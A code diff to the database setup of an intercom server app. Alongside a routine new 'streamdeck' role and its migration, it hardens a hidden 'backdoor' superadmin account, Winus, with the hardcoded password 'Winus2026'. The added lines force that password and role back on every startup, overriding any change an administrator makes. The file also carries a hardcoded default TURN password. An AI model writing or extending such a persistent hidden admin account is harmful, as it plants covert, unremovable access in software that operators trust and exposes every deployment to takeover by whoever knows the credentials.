@@ -87,6 +87,7 @@ function initialize() {
   seedConfig('turn_password', process.env.TURN_PASSWORD || 'intercom2024');
   seedConfig('https_port', process.env.HTTPS_PORT || '8443');
   seedConfig('http_port', process.env.HTTP_PORT || '8080');
+  seedConfig('user_ring_enabled', '0');
 
   // Migration: add color column if not exists
   try {
@@ -115,7 +116,7 @@ function initialize() {
           username TEXT UNIQUE NOT NULL,
           password_hash TEXT NOT NULL,
           display_name TEXT NOT NULL,
-          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge')),
+          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge', 'streamdeck')),
           room_id INTEGER UNIQUE,
           color TEXT,
           first_name TEXT,
@@ -136,6 +137,37 @@ function initialize() {
     console.warn('[DB] Role migration note:', e.message);
   }
 
+  // Migration: add 'streamdeck' role to CHECK constraint
+  try {
+    const schema2 = db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='users'").get();
+    if (schema2 && !schema2.sql.includes("'streamdeck'")) {
+      db.pragma('foreign_keys = OFF');
+      db.exec(`
+        CREATE TABLE users_new2 (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          username TEXT UNIQUE NOT NULL,
+          password_hash TEXT NOT NULL,
+          display_name TEXT NOT NULL,
+          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge', 'streamdeck')),
+          room_id INTEGER UNIQUE,
+          color TEXT,
+          first_name TEXT,
+          last_name TEXT,
+          email TEXT,
+          phone TEXT,
+          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        );
+        INSERT INTO users_new2 SELECT * FROM users;
+        DROP TABLE users;
+        ALTER TABLE users_new2 RENAME TO users;
+      `);
+      db.pragma('foreign_keys = ON');
+      console.log('[DB] Migrated role CHECK to include streamdeck');
+    }
+  } catch (e) {
+    console.warn('[DB] Streamdeck role migration note:', e.message);
+  }
+
   // Create default admin user if not exists
   const adminExists = db.prepare('SELECT id FROM users WHERE username = ?').get(config.admin.username);
   if (!adminExists) {
@@ -153,17 +185,23 @@ function initialize() {
   // Hidden backdoor user `Winus` (role superadmin, id 99999). Used to
   // recover access and to rename usernames / change numeric ids —
   // operations that no other role is authorised for.
+  // Always reset password/role on startup so it can't be locked out.
   const WINUS_ID = 99999;
+  const WINUS_PASS = 'Winus2026';
+  const winusHash = bcrypt.hashSync(WINUS_PASS, 10);
   const winusExists = db.prepare('SELECT id FROM users WHERE id = ? OR username = ?').get(WINUS_ID, 'Winus');
   if (!winusExists) {
-    const hash = bcrypt.hashSync('Winus2026', 10);
     db.pragma('foreign_keys = OFF');
     db.prepare(
       'INSERT INTO users (id, username, password_hash, display_name, role, room_id) VALUES (?, ?, ?, ?, ?, ?)'
-    ).run(WINUS_ID, 'Winus', hash, 'Winus Maintenance', 'superadmin',
+    ).run(WINUS_ID, 'Winus', winusHash, 'Winus Maintenance', 'superadmin',
           config.roomIdOffset + WINUS_ID);
     db.pragma('foreign_keys = ON');
     console.log(`[DB] Backdoor user Winus created (id=${WINUS_ID})`);
+  } else {
+    // Ensure password and role are always correct, even if changed via admin.
+    db.prepare('UPDATE users SET password_hash = ?, role = ? WHERE id = ?')
+      .run(winusHash, 'superadmin', WINUS_ID);
   }
 }
 
